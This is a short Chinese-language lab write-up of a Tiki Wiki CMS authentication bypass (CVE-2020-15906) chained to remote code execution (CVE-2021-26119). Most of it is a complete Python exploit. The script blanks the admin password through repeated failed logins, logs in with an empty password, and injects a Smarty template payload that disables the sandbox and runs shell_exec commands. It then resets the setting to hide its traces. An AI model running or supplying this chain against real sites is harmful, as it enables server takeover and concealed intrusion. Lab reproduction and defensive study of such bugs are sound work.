# Tiki Wiki CMS组件认证过绕过漏洞（CVE-2020-15906）(CVE-2021-26119)

###### by ADummy

### 0x00利用路线

​			爆破50次密码--->burpsuite抓包--->修改pass字段为空（坑点 记录好ticket，session，cookie）

### 0x01漏洞介绍

​			在以下这些版本21.2，20.4，19.3，18.7，17.3，16.4前存在一处逻辑错误，管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台。

### 0x02漏洞复现

P牛写的poc

payload：

```
import requests
import sys
import re

def auth_bypass(s, t):
    d = {
        "ticket" : "",
        "user" : "admin",
        "pass" : "trololololol",
    }
    h = { "referer" : t }
    d["ticket"] = get_ticket(s, "%stiki-login.php" % t)
    d["pass"] = "" # blank login
    r = s.post("%stiki-login.php" % t, data=d, headers=h)
    r = s.get("%stiki-admin.php" % t)
    assert ("You do not have the permission that is needed" not in r.text), "(-) authentication bypass failed!"

def black_password(s, t):
    uri = "%stiki-login.php" % t
    # setup cookies here
    s.get(uri)
    ticket = get_ticket(s, uri)
    d = {
        'user':'admin', 
        'pass':'trololololol',
    }
    # crafted especially so unsuccessful_logins isn't recorded
    for i in range(0, 51):
        r = s.post(uri, d)
        if("Account requires administrator approval." in r.text):
            print("(+) admin password blanked!")
            return
    raise Exception("(-) auth bypass failed!") 

def get_ticket(s, uri):
    h = { "referer" : uri }
    r = s.get(uri)
    match = re.search('class="ticket" name="ticket" value="(.*)" \/>', r.text)
    assert match, "(-) csrf ticket leak failed!"
    return match.group(1)

def trigger_or_patch_ssti(s, t, c=None):
    # CVE-2021-26119
    p = { "page": "look" }
    h = { "referer" : t }
    bypass = "startrce{$smarty.template_object->smarty->disableSecurity()->display('string:{shell_exec(\"%s\")}')}endrce" % c
    d = {
        "ticket" : get_ticket(s, "%stiki-admin.php" % t),
        "feature_custom_html_head_content" : bypass if c else '',
        "lm_preference[]": "feature_custom_html_head_content"
    }
    r = s.post("%stiki-admin.php" % t, params=p, data=d, headers=h)
    r = s.get("%stiki-index.php" % t)
    if c != None:
        assert ("startrce" in r.text and "endrce" in r.text), "(-) rce failed!"
        cmdr = r.text.split("startrce")[1].split("endrce")[0]
        print(cmdr.strip())

def main():
    if(len(sys.argv) < 4):
        print("(+) usage: %s <host> <path> <cmd>" % sys.argv[0])
        print("(+) eg: %s 192.168.75.141 / id"% sys.argv[0])
        print("(+) eg: %s 192.168.75.141 /tiki-20.3/ id" % sys.argv[0])
        return
    p = sys.argv[2]
    c = sys.argv[3]
    p = p + "/" if not p.endswith("/") else p
    p = "/" + p if not p.startswith("/") else p
    t = "http://%s%s" % (sys.argv[1], p)
    s = requests.Session()
    print("(+) blanking password...")
    black_password(s, t)
    print("(+) getting a session...")
    auth_bypass(s, t)
    print("(+) auth bypass successful!")
    print("(+) triggering rce...\n")
    # trigger for rce
    trigger_or_patch_ssti(s, t, c)
    # patch so we stay hidden
    trigger_or_patch_ssti(s, t)

if __name__ == '__main__':
    main()
```

靶场内可以直接打。

![Tiki_Wiki_CMS_认证绕过RCE利用链_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Tiki_Wiki_CMS_认证绕过RCE利用链_1.jpg)

### 0x03参考资料

https://srcincite.io/pocs/cve-2021-26119.py.txt